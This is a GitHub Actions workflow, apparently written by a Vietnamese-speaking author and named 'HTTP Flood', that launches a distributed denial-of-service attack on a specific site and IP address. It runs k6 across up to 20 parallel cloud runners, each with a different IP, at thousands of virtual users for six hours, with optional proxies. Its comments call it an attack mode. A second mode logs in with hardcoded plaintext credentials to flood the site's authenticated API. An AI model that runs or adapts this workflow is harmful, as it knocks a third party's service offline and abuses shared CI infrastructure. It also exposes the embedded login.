name: HTTP Flood — thanhhuyreal

on:
  workflow_dispatch:
    inputs:
      mode:
        description: 'Che do tan cong'
        required: true
        default: 'ip'
        type: choice
        options:
          - ip          # Danh thang vao IP goc (103.211.206.175), khong can login
          - auth        # Login truoc roi danh authenticated API (nang hon)
      runners:
        description: 'So runner song song (moi runner = 1 IP Azure khac nhau)'
        required: true
        default: '5'
      max_vus:
        description: 'Max VUs moi runner'
        required: false
        default: '5000'
      stages:
        description: 'Stages override (de trong = dung mac dinh)'
        required: false
        default: ''
      phpsessid:
        description: '[Auth mode] PHPSESSID (de trong = tu dong login)'
        required: false
        default: ''
      proxy:
        description: 'Proxy URL (de trong = khong dung proxy)'
        required: false
        default: ''

jobs:
  prepare:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - id: set-matrix
        run: |
          COUNT=${{ github.event.inputs.runners }}
          MATRIX=$(python3 -c "import json; print(json.dumps(list(range(1, int('$COUNT')+1))))")
          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT

  flood:
    needs: prepare
    name: "[${{ github.event.inputs.mode }}] Runner ${{ matrix.runner }}"
    runs-on: ubuntu-latest
    timeout-minutes: 360
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        runner: ${{ fromJson(needs.prepare.outputs.matrix) }}

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup k6 (native)
        uses: grafana/setup-k6-action@v1

      - name: Tang ulimit
        run: ulimit -n 131072 || true

      - name: Runner info
        run: |
          echo "Mode    : ${{ github.event.inputs.mode }}"
          echo "Runner  : ${{ matrix.runner }}"
          echo "IP      : $(curl -sf https://api.ipify.org || echo unknown)"
          echo "CPU     : $(nproc) cores"
          echo "RAM     : $(free -m | awk '/Mem:/{print $4}') MB free"

      # ─────────────────────────────────────────────
      # MODE: ip — danh thang IP goc, khong login
      # ─────────────────────────────────────────────
      - name: "[ip] Flood IP truc tiep"
        if: ${{ github.event.inputs.mode == 'ip' }}
        env:
          TARGET_URL:       "http://103.211.206.175/"
          STAGES:           ${{ github.event.inputs.stages || '30s:500,60s:5000,360m:5000' }}
          START_RATE:       "200"
          PRE_VUS:          "500"
          MAX_VUS:          ${{ github.event.inputs.max_vus || '5000' }}
          REQUEST_TIMEOUT:  "15s"
          REQUEST_DELAY:    "0"
          MAX_5XX_RATE:     "0.9"
          MAX_TIMEOUT_RATE: "0.9"
          HTTP_PROXY:       ${{ github.event.inputs.proxy }}
          HTTPS_PROXY:      ${{ github.event.inputs.proxy }}
        run: |
          ulimit -n 131072 || true
          [ -n "$HTTP_PROXY" ] && echo "Proxy: $HTTP_PROXY" || echo "Direct (no proxy)"
          k6 run --no-usage-report sites/thanhhuyreal/test-script.js

      # ─────────────────────────────────────────────
      # MODE: auth — tu dong login, flood authenticated API
      # ─────────────────────────────────────────────
      - name: "[auth] Flood authenticated API"
        if: ${{ github.event.inputs.mode == 'auth' }}
        env:
          IP_URL:           "http://103.211.206.175"
          SITE_HOST:        "thanhhuyreal.com"
          PHPSESSID:        ${{ github.event.inputs.phpsessid }}
          PHP_IDENTIFIER:   "lonussystem"
          PHP_PASSWORD:     "lonussystem123@"
          STAGES:           ${{ github.event.inputs.stages || '30s:500,60s:2000,60s:5000,360m:5000' }}
          START_RATE:       "100"
          PRE_VUS:          "500"
          MAX_VUS:          ${{ github.event.inputs.max_vus || '8000' }}
          REQUEST_TIMEOUT:  "30s"
          MAX_ERR_RATE:     "0.9"
        run: |
          ulimit -n 131072 || true
          k6 run --no-usage-report sites/thanhhuyreal/test-script-auth.js
